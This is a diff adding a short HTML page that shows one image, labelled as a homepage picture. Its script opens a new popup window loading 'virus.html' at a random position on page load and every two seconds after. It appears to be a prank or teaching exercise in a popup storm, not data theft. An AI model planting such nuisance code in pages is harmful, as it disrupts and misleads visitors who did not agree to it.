@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html>
+
+	<head>
+		<meta charset="UTF-8">
+		<title></title>
+		<style type="text/css">
+			body {
+				margin: 0px;
+			}
+		</style>
+		<script type="text/javascript">
+			window.setInterval("abc()", 2000);
+
+			function abc() {
+				var a = Math.floor(Math.random() * 300);
+				var b = Math.floor(Math.random() * 500);
+				window.open("virus.html", "",
+					"width=250px height=269px top=" + a + " left=" + b + "");
+			}
+		</script>
+	</head>
+
+	<body onload="abc()">
+		<img src="img/webPic.jpg" alt="首页图片" />
+	</body>
+
+</html>
